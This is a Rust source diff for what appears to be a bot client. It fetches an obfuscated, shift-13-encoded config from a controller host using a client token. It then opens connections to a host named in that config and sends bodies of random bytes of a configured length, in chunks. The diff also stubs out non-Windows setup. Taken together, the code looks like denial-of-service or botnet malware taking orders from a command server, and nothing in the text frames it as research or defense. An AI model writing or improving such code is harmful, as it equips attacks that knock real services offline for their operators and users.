@@ -1,22 +1,91 @@
 #![allow(dead_code)]
 pub mod config;
 pub mod connection;
-mod image_placeholder;
 pub mod macros;
 pub mod response;
-mod util;
+pub mod util;
 
 use config::{AppConfig, ControllerConfig};
 use connection::create_stream;
 use response::Response;
-use std::{error, io::Read, io::Write, net::TcpStream};
+use std::error;
 use util::{gen_random_byte, parse_config};
+
+static CONF_DEFAULT_HOST: &str = "localhost";
+static CONF_DEFAULT_PORT: u16 = 3000;
+static CONF_DEFAULT_PATH: &str = "/";
+static CONF_DEFAULT_METHOD: &str = "GET";
+static CONF_DEFAULT_SSL: bool = false;
+static DEFAULT_PLACEHOLDER_PATH: &str = "placeholder.jpg";
 
 static BODY_SEPARATOR: &str = "\r\n\r\n";
 static MAX_BUFFER_CHUNK_SIZE: u32 = 1024;
 static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;
+static CONFIG_SEPARATOR: &str = ";";
+static CONFIG_PAIR_SEPARATOR: &str = "=";
 
 pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
+
+pub fn fetch_controller_config() -> Result<ControllerConfig> {
+  let host: &'static str = option_env!("CONF_HOST").unwrap_or(CONF_DEFAULT_HOST);
+  let port: u16 = option_env!("CONF_PORT")
+    .unwrap_or(&CONF_DEFAULT_PORT.to_string())
+    .parse()
+    .unwrap_or(CONF_DEFAULT_PORT);
+  let path: &'static str = option_env!("CONF_PATH").unwrap_or(CONF_DEFAULT_PATH);
+  let method: &'static str = option_env!("CONF_METHOD").unwrap_or(CONF_DEFAULT_METHOD);
+  let ssl: bool = option_env!("CONF_SSL")
+    .unwrap_or(&CONF_DEFAULT_SSL.to_string())
+    .parse()
+    .unwrap_or(CONF_DEFAULT_SSL);
+
+  let app_conf = get_app_config().unwrap_or_default();
+  let headers = format!(
+    "{} {} HTTP/1.1\nAccept: */*\nx-client-token: {}{}",
+    method, path, app_conf.token, BODY_SEPARATOR
+  );
+  let mut res = String::new();
+  let mut stream = create_stream(ssl, host, port)?;
+
+  stream.w(&headers.as_bytes())?;
+  stream.r(&mut res)?;
+
+  let res: Response = Response::from(res);
+
+  let conf = parse_config(&res.decrypted_body());
+  let conf = ControllerConfig::from(conf);
+
+  debug!("Done fetching config {:?}.", conf);
+
+  Ok(conf)
+}
+
+pub fn call(conf: &ControllerConfig) -> Result<Response> {
+  let mut stream = create_stream(conf.ssl, &conf.host, conf.port)?;
+  let body: Vec<u8> = vec![0; conf.content_length as usize]
+    .iter()
+    .map(|_| gen_random_byte())
+    .collect();
+  let mut res = String::new();
+
+  stream.w(conf.headers.as_bytes())?;
+  stream.w("\n\n".as_bytes())?;
+
+  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
+    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
+      stream.w(&chunk)?;
+    }
+  } else {
+    stream.w(&body)?;
+  }
+
+  stream.w(&[0; 1])?;
+  stream.r(&mut res)?;
+
+  debug!("Done calling {}...", conf.get_addr());
+
+  return Ok(Response::from(res));
+}
 
 #[cfg(target_os = "windows")]
 pub fn setup() -> Result<()> {
@@ -86,29 +155,7 @@ pub fn setup() -> Result<()> {
 
 #[cfg(not(target_os = "windows"))]
 pub fn setup() -> Result<()> {
-  todo!();
-}
-
-pub fn fetch_controller_config(addr: &str) -> Result<ControllerConfig> {
-  let app_conf = get_app_config().unwrap_or_default();
-  let headers = format!(
-    "GET / HTTP/1.1\nAccept: */*\nx-client-token: {}{}",
-    app_conf.token, BODY_SEPARATOR
-  );
-  let mut res = String::new();
-  let mut stream = TcpStream::connect(addr)?;
-
-  stream.write(&headers.as_bytes())?;
-  stream.read_to_string(&mut res)?;
-
-  let res: Response = Response::from(res);
-
-  let conf = parse_config(&res.decrypted_body());
-  let conf = ControllerConfig::from(conf);
-
-  debug!("Done fetching config {:?}.", conf);
-
-  Ok(conf)
+  Ok(())
 }
 
 #[cfg(target_os = "windows")]
@@ -125,32 +172,5 @@ pub fn get_app_config() -> Result<AppConfig> {
 
 #[cfg(not(target_os = "windows"))]
 pub fn get_app_config() -> Result<AppConfig> {
-  todo!();
-}
-
-pub fn call(conf: &ControllerConfig) -> Result<Response> {
-  let mut stream = create_stream(&conf);
-  let body: Vec<u8> = vec![0; conf.content_length as usize]
-    .iter()
-    .map(|_| gen_random_byte())
-    .collect();
-  let mut res = String::new();
-
-  stream.w(conf.headers.as_bytes())?;
-  stream.w("\n\n".as_bytes())?;
-
-  if conf.content_length > MAX_BUFFER_CHUNK_SIZE {
-    for chunk in body.chunks(MAX_BUFFER_CHUNK_SIZE as usize) {
-      stream.w(&chunk)?;
-    }
-  } else {
-    stream.w(&body)?;
-  }
-
-  stream.w(&[0; 1])?;
-  stream.r(&mut res)?;
-
-  debug!("Done calling {}...", conf.get_addr());
-
-  return Ok(Response::from(res));
+  Ok(AppConfig::default())
 }
